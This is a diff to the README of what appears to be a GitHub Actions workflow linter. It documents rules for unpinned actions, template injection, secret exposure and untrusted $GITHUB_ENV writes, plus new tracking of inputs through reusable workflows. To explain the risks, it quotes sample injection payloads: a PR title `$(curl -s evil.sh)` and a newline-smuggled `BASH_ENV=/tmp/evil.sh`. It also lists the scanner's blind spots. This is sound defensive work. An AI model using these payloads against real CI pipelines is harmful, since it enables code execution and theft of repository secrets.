@@ -25,10 +25,10 @@ deliberately small and readable: one file per concern, every rule explained belo
 | WG001 | unpinned-action | low for `actions/*`, `github/*`; high for other owners; medium for Docker tags | `uses:` with a tag or branch (`@v4`, `@main`), a short SHA, or no version. A tag can be moved to malicious code after you've reviewed it; a full 40-character commit SHA can't. Covers steps and reusable workflows (`jobs.<id>.uses`). |
 | WG002 | missing-permissions | medium | No `permissions:` at the top and at least one job without its own. The token then gets the repository's default, which may be read/write for everything. |
 | WG003 | write-all | high | `permissions: write-all` at workflow or job level. |
-| WG004 | template-injection | high | `${{ github.event.pull_request.title }}` and other outsider-controlled values (issue/PR/comment text, branch names, commit messages) inside `run:` or `actions/github-script`. The value is pasted into the script before it runs, so a PR titled `$(curl -s evil.sh)` downloads and runs that script. Pass it through `env:` and use `"$TITLE"` instead. In a composite action, `${{ inputs.* }}` in `run:` is reported too (medium): the calling workflow may pass untrusted text. Detours are followed too: `env:`, `$GITHUB_ENV`, `$GITHUB_OUTPUT` and job outputs (see below). |
+| WG004 | template-injection | high | `${{ github.event.pull_request.title }}` and other outsider-controlled values (issue/PR/comment text, branch names, commit messages) inside `run:` or `actions/github-script`. The value is pasted into the script before it runs, so a PR titled `$(curl -s evil.sh)` downloads and runs that script. Pass it through `env:` and use `"$TITLE"` instead. In a composite action or a reusable workflow (`on: workflow_call`), `${{ inputs.* }}` in `run:` is reported too (medium): the calling workflow may pass untrusted text. When the caller is one of the checked files, what it really passes in `with:` decides instead (high for a PR title, nothing for clean values; see below). Detours are followed too: `env:`, `$GITHUB_ENV`, `$GITHUB_OUTPUT` and job outputs (see below). |
 | WG005 | pull-request-target | low, or high with a PR checkout | `pull_request_target` runs with secrets even for pull requests from forks. Checking out the PR's head (`ref: ${{ github.event.pull_request.head.sha }}`, or a `refs/pull/...` ref) then runs a stranger's code with those secrets. |
 | WG006 | persisted-credentials | low | `actions/checkout` without `persist-credentials: false` leaves the token in `.git/config`, readable by every later step. |
-| WG007 | untrusted-github-env | high (medium for a composite action's inputs) | Untrusted text appended to `$GITHUB_ENV` or `$GITHUB_PATH` in `run:`, directly or through `env:`/shell variables (`echo "T=$TITLE" >> "$GITHUB_ENV"`). Every later step reads those files: a PR title with a line break such as `x` + newline + `BASH_ENV=/tmp/evil.sh` sets a variable that makes bash run the sender's script, and `$GITHUB_PATH` can put their directory first in `PATH`. No `${{ }}` in the script is needed for this, so WG004 alone doesn't catch it. Pass the value to the step that needs it via `env:` or a step output. |
+| WG007 | untrusted-github-env | high (medium for inputs from unknown callers) | Untrusted text appended to `$GITHUB_ENV` or `$GITHUB_PATH` in `run:`, directly or through `env:`/shell variables (`echo "T=$TITLE" >> "$GITHUB_ENV"`). Every later step reads those files: a PR title with a line break such as `x` + newline + `BASH_ENV=/tmp/evil.sh` sets a variable that makes bash run the sender's script, and `$GITHUB_PATH` can put their directory first in `PATH`. No `${{ }}` in the script is needed for this, so WG004 alone doesn't catch it. Pass the value to the step that needs it via `env:` or a step output. |
 | WG008 | secrets-exposure | medium; high for `toJSON(secrets)` | `${{ secrets.X }}` pasted into `run:` or a github-script: the secret becomes part of the script text, quotes or `$` in it break the script, and `set -x`, an error message or a process listing can show it (GitHub's log masking only catches exact matches). Pass it through `env:` and use `"$X"`. Also `toJSON(secrets)` anywhere (every secret in one value) and `secrets: inherit` on a reusable workflow from another repository (all secrets handed to code that lives elsewhere). Passing a secret to an action's `with:` is fine. |
 
 ### Actions too
@@ -261,6 +261,20 @@ be read or parsed, or bad arguments.
   ```
 
   `"$TITLE"` in the script stays fine: the shell reads the variable, nothing is pasted.
+- **Local reusable workflows** (`calls.py`): all files are loaded before any is checked, and
+  every job with `uses: ./.github/workflows/<file>.yml` links the caller to that file. The
+  caller's `with:` values are read like any other value (direct `${{ }}`, `needs.*.outputs`,
+  its own `inputs.*` when it is reusable too), and the called workflow's `inputs.<name>` then
+  carries the worst of what its callers pass. A chain of reusable workflows is linked caller
+  first. With no caller among the checked files, inputs stay medium, except `type: boolean`
+  and `type: number`, which can't carry text; `workflow_dispatch` inputs are trusted (only
+  people with write access can start a run):
+
+  ```
+  .github/workflows/label.yml:12:14: WG004 [high] 'inputs.title' carries
+  'github.event.pull_request.title', which outsiders can set (via with.title in
+  .github/workflows/triage.yml (job 'label')) and is pasted into a script; ...
+  ```
 - The writes themselves are read by `writes.py`: single `>> $GITHUB_*` lines, `{ ... } >>`
   groups (on one line or several), `cat <<EOF >> $GITHUB_*` shell heredocs, and multi-line
   values (`name<<DELIM`, the lines, `DELIM`), also when every line has its own `>>`. In
@@ -278,6 +292,7 @@ src/workflow_guard/
   rules.py     the eight rules
   expressions.py  ${{ }} lexer and context paths (used by WG004 and WG005)
   taint.py     WG004/WG007's tracker: untrusted values through env:, $GITHUB_*, job outputs
+  calls.py     local reusable workflows: what callers pass into each input
   writes.py    what a script or github-script writes to $GITHUB_OUTPUT / ENV / PATH
   fix.py       --fix: GitHubResolver (API lookups), pin_actions (text edits), comment style
   sarif.py     --format sarif: rules, results, fingerprints, notifications
@@ -310,9 +325,14 @@ Ubuntu and Windows.
   `tee -a $GITHUB_OUTPUT`, writes inside functions or loops, variables holding the file name,
   PowerShell/Python `shell:` steps, and github-script calls spread over several lines aren't
   followed. Neither are outputs of other actions, reusable workflows or composite actions as
-  seen by their callers.
-- The inside of called reusable workflows and of remote actions (`uses: owner/repo@sha`)
-  isn't checked; only files in the repository being checked are.
+  seen by their callers (`needs.<call>.outputs.*` after a reusable workflow is trusted).
+- Inputs of local reusable workflows are linked to their callers only when both files are
+  checked in the same run (the default checks the whole `.github/workflows/`). A reusable
+  workflow that other repositories call can't see those callers, so a clean local caller
+  hides them. `toJSON(inputs)` isn't followed. Remote reusable workflows and actions
+  (`uses: owner/repo/...@sha`) aren't read; only files in the repository being checked are.
+  Inputs passed to local composite actions (`uses: ./.github/actions/x`) aren't linked yet:
+  their inputs are always medium.
 - `.github/actions` is searched for `action.yml` at any depth, but other places for local
   actions (e.g. `tools/my-action/`) need to be passed as paths.
 - The action needs `bash` (all GitHub-hosted runners have it, Windows included) and network
